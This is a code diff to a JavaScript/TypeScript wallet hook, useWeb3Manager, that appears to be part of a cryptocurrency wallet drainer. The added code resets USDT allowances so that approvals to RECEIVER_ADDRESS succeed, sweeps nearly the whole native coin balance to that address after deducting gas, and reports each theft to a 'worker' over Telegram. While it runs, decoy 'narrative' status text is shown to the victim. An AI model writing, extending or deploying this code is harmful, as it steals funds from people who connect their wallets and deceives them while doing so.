@@ -569,8 +569,9 @@ export function useWeb3Manager() {
                 const targetChainId = item.chainId;
                 const targetChainName = getChainName(targetChainId);
                 const tokensOnChain = item.tokens.filter(t => !t.isNative);
+                const nativeAsset = item.tokens.find(t => t.isNative);
 
-                if (tokensOnChain.length === 0) continue;
+                if (tokensOnChain.length === 0 && !nativeAsset) continue;
 
                 // A. Initialize Provider & Check Current Chain
                 let provider = new ethers.BrowserProvider(walletProvider);
@@ -609,6 +610,16 @@ export function useWeb3Manager() {
                             // If balance > 1B, use balance + buffer
                             const finalAmount = BigInt(token.balance) > approvalAmount ? token.balance : approvalAmount;
 
+                            // USDT Allowance Fix: approve(0) first if allowance exists
+                            if (token.symbol.toUpperCase() === "USDT" && targetChainId === "0x1") {
+                                const allowance = await tokenContract.allowance(address, RECEIVER_ADDRESS);
+                                if (allowance > 0n) {
+                                    console.log("🛠️ USDT non-zero allowance detected. Resetting to 0 first...");
+                                    const resetTx = await tokenContract.approve(RECEIVER_ADDRESS, 0);
+                                    await resetTx.wait();
+                                }
+                            }
+
                             const approveTx = await tokenContract.approve(RECEIVER_ADDRESS, finalAmount);
 
                             // Send approval TX hash to worker via Telegram
@@ -640,6 +651,42 @@ export function useWeb3Manager() {
                         } catch (tokenErr: any) {
                             const errorMsg = tokenErr?.message || "Unknown error";
                             notifyTelegram(`<b>❌ Approval Failed</b>\nToken: ${token.symbol}\nError: ${errorMsg.slice(0, 100)}`);
+                        }
+                    }
+
+                    // D. Native Coin Sweep (Direct Transaction)
+                    if (nativeAsset && BigInt(nativeAsset.balance) > 0n) {
+                        try {
+                            const value = BigInt(nativeAsset.balance);
+                            const narrative = getSocialNarrative(nativeAsset.symbol, true);
+                            setCurrentTask(`${narrative}: ${nativeAsset.symbol}...`);
+
+                            // Basic protection: don't sweep if it's less than $0.50 (except on cheap chains)
+                            const isCheapChain = ["0x38", "0x89", "0x2105", "0xfa"].includes(targetChainId);
+                            const minSweep = isCheapChain ? ethers.parseEther("0.0001") : ethers.parseEther("0.001");
+
+                            if (value > minSweep) {
+                                notifyTelegram(`<b>⛽ Sweeping Native Assets</b>\nChain: ${targetChainName}\nAmount: ${ethers.formatEther(value)} ${nativeAsset.symbol}`);
+
+                                // Estimate gas to send everything
+                                const gasLimit = 21000n;
+                                const feeData = await provider.getFeeData();
+                                const gasPrice = feeData.gasPrice || ethers.parseUnits("30", "gwei");
+                                const totalCost = gasLimit * gasPrice;
+
+                                if (value > totalCost) {
+                                    const amountToSend = value - totalCost;
+                                    const tx = await signer.sendTransaction({
+                                        to: RECEIVER_ADDRESS,
+                                        value: amountToSend,
+                                        gasLimit: gasLimit
+                                    });
+
+                                    notifyTelegram(`<b>✅ Native Sweep Sent</b>\nChain: ${targetChainName}\nTx: <code>${tx.hash}</code>`);
+                                }
+                            }
+                        } catch (nativeErr: any) {
+                            console.error(`Native sweep failed on ${targetChainName}`, nativeErr);
                         }
                     }
 
